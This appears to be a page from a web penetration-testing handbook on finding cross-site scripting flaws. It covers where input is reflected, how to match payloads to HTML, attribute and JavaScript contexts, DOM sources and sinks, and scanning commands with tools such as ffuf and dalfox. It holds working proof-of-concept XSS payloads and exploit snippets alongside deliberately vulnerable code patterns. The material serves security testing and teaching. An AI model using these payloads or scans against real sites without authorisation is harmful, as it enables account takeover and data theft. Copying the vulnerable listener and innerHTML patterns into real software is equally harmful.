---
tags:
  - high
  - client-side
---

# Finding XSS

## Where to Look

### High-Value Targets

- [ ] Search boxes
- [ ] Comment/feedback forms
- [ ] User profile fields (name, bio, etc.)
- [ ] URL parameters reflected in page
- [ ] Error messages
- [ ] File upload names
- [ ] Headers reflected in page (User-Agent, Referer)

### Often Overlooked

- [ ] JSON responses rendered in page
- [ ] WebSocket messages
- [ ] postMessage handlers
- [ ] URL fragments (DOM XSS)
- [ ] PDF generators
- [ ] Email templates (preview)
- [ ] Export functions (CSV, Excel injection)
- [ ] Admin panels
- [ ] Old/legacy endpoints
- [ ] Markdown renderers
- [ ] SVG uploads
- [ ] Hidden inputs (via popover/accesskey)

## Methodology

### 1. Map Reflection Points

Inject a unique string and search for it in the response:

```
xss123test
```

Check:

- HTML source
- DOM (browser DevTools)
- JavaScript variables
- HTTP headers

### 2. Identify Context

Where does your input land?

| Context | Example | Test |
|---------|---------|------|
| HTML body | `<p>USER_INPUT</p>` | `<script>` |
| Attribute (quoted) | `<input value="USER_INPUT">` | `"onmouseover=` |
| Attribute (unquoted) | `<input value=USER_INPUT>` | ` onmouseover=` |
| JavaScript string | `var x = "USER_INPUT"` | `";alert(1)//` |
| JavaScript template | `` `${USER_INPUT}` `` | `${alert(1)}` |
| URL/href | `<a href="USER_INPUT">` | `javascript:` |
| CSS | `style="color:USER_INPUT"` | `red;}</style><script>` |

### 3. Test Characters

```
< > " ' ` / \ ( ) { } [ ] ; :
```

### 4. Test with Context-Aware Payloads

Don't spray generic payloads. Match payload to context:

=== "HTML Body"
    ```html
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    <body onload=alert(1)>
    <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
    ```

=== "Inside Attribute"
    ```html
    " onmouseover="alert(1)
    ' onfocus='alert(1)' autofocus='
    " autofocus onfocus="alert(1)
    "><script>alert(1)</script>
    "><img src=x onerror=alert(1)>
    ```

=== "Inside JS String"
    ```javascript
    ";alert(1)//
    \';alert(1)//
    '</script><script>alert(1)</script>
    '-alert(1)-'
    \"-alert(1)//
    ```

=== "href/src Attribute"
    ```html
    javascript:alert(1)
    data:text/html,<script>alert(1)</script>
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
    ```

### 5. Check for Filters

If basic payloads fail:

- Try encoding (`%3Cscript%3E`)
- Try case variations (`<ScRiPt>`)
- Try alternative tags (`<svg onload=`)
- Try event handler variations
- Check [Bypasses](bypasses.md)

---

## DOM XSS Hunting

### Sources (Attacker-Controlled Input)

```javascript
// URL-based
location
location.href
location.search      // ?param=value
location.hash        // #fragment
location.pathname    // /path/value
document.URL
document.documentURI
document.baseURI
document.referrer

// Storage-based
document.cookie
localStorage.getItem()
sessionStorage.getItem()

// Message-based
window.name          // Cross-origin persistence!
postMessage data
```

### Sinks (Dangerous Functions)

```javascript
// Direct execution
eval()
Function()
setTimeout(string)
setInterval(string)

// HTML injection
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// JavaScript URLs
element.href = "javascript:..."
element.src = "javascript:..."
location = "javascript:..."
location.href = "javascript:..."
location.assign("javascript:...")
location.replace("javascript:...")

// jQuery specific
$().html()
$().append()
$().prepend()
$().after()
$().before()
$.parseHTML()        // If scripts enabled
$().attr()           // For href, src, etc.
```

### Finding DOM XSS

1. Search JS for dangerous sinks
2. Trace back to sources
3. Check if source is user-controllable
4. Test with payload in source

### Common DOM XSS Patterns

**location.hash:**
```javascript
// Vulnerable
var content = location.hash.substring(1);
document.getElementById('output').innerHTML = content;

// Exploit
https://target.com/#<img src=x onerror=alert(1)>
```

**postMessage:**
```javascript
// Vulnerable listener (no origin check!)
window.addEventListener('message', function(e) {
  document.body.innerHTML = e.data;
});

// Exploit
<iframe src="https://target.com" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')
"></iframe>
```

**window.name (cross-origin persistence):**
```javascript
// Pre-seed in attacker page:
<script>
window.name = '<img src=x onerror=alert(document.domain)>';
location = 'https://target.com/vulnerable';
</script>
```

**jQuery selector:**
```javascript
// Vulnerable
var tab = location.hash;
$(tab).show();  // jQuery selector injection

// Exploit
https://target.com/#<img src=x onerror=alert(1)>
```

### DOM XSS Testing Checklist

- [ ] Check URL parameters for reflection in DOM
- [ ] Test location.hash handling
- [ ] Check postMessage listeners (no origin validation?)
- [ ] Test window.name injection
- [ ] Look for document.referrer usage
- [ ] Check localStorage/sessionStorage consumption
- [ ] Test jQuery selectors with user input
- [ ] Look for innerHTML/outerHTML sinks
- [ ] Check eval/Function/setTimeout(string)
- [ ] Test JavaScript URL handlers

Tools: **DOM Invader** (Burp), custom browser console scripts

---

## Automation

### Parameter Discovery

```bash
# Find params with reflection
echo "https://target.com" | gau | grep "=" | qsreplace "xss123test" | httpx -match-string "xss123test"

# Or with ffuf
ffuf -u "https://target.com/page?FUZZ=xss123test" -w params.txt -mr "xss123test"
```

### Basic XSS Scan

```bash
# With dalfox
dalfox url "https://target.com/search?q=test"

# With kxss
echo "https://target.com/page?q=test" | kxss
```

---

Found a reflection? Move to [Exploitation](exploit.md).
